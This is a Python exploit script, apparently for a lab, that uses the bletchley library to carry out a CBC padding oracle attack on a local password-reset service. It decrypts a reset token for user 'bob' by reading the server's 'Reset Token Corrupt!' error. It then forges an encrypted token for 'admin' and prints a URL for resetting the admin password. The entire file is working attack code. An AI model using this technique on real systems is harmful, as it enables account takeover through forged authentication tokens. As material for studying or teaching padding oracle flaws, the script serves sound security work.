#!/usr/bin/env python3

import sys
import time
import json
from bletchley import blobtools,buffertools
from bletchley import chosenct
from bletchley.CBC import *

host = '127.0.0.1'
port = 8888
protocol = 'http'


def fetchFreshToken():
    gen_url = '%s://%s:%d/generate-reset-token?user=bob' % (protocol,host,port)
    response = requests.get(gen_url)
    return response.content.split(b'token=',1)[1].split(b'"')[0]


def decode(token):
    return blobtools.decodeChain(['percent/upper','base64/rfc3548'], token)


def encode(binary):
    return blobtools.encodeChain(['base64/rfc3548','percent/upper'], binary)


try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    sys.stderr.write('ERROR: Could not import requests module.  Ensure it is installed.\n')
    sys.stderr.write('       Under Debian, the package name is "python3-requests"\n.')
    sys.stderr.write('       Alternatively, re-generate this script using the --native option.\n.')
    sys.exit(1)


session = requests.Session()
def sendRequest(session, data=None):
    data = data.decode('utf-8')
    method = 'GET'
    path = '/reset-password?token='+data
    url = "%s://%s:%d%s" % (protocol,host,port,path)
    body = (b'')

    # Set verify=True if you want to validate the server cert
    return session.request(method, url, headers={}, data=body, allow_redirects=False, verify=False)
    

def processResponse(data, iv=None):
    global session
    global poa
    global ciphertext
    global decrypting
    
    if decrypting:
        length = len(ciphertext)-len(iv)-len(poa.decrypted)
        #'\x1b[1;31m'  '\x1b[39;49m'
        
        if len(poa.decrypted) > 0:
            d = repr(('?'*length)+poa.decrypted.decode('utf-8'))
            d = d[0:length+1] + '\x1b[1;31m' +d[length+1:length+2] + '\x1b[0m' + d[length+2:]
            print('\x1b[F '+d, file=sys.stderr)
    response = sendRequest(session, encode(iv+data))

    if b'Reset Token Corrupt!' in response.content:
        return False
    return True


decrypting = True
token = fetchFreshToken()
print('Fetched new password reset token for bob: ' + token.decode('utf-8')+'\n',file=sys.stderr)
ciphertext = decode(token)
#print(processResponse(ciphertext), file=sys.stderr)

# Padding Oracle Attacks 
poa = POA(processResponse, 16, ciphertext[16:], iv=ciphertext[0:16], threads=1)
#print(poa.probe_padding()) # sanity check
print('\x1b[F \''+poa.decrypt().decode('utf-8'))
decrypting = False

print('Now encrypting forged token...', file=sys.stderr)
iv,ciphertext = poa.encrypt(json.dumps({'user':'admin','expires':int(time.time()+1000*24*60*60)}).encode('utf-8'))
print("Use this URL to reset the admin's password:")
print(' http://127.0.0.1:8888/reset-password?token='+encode(iv+ciphertext).decode('utf-8'))
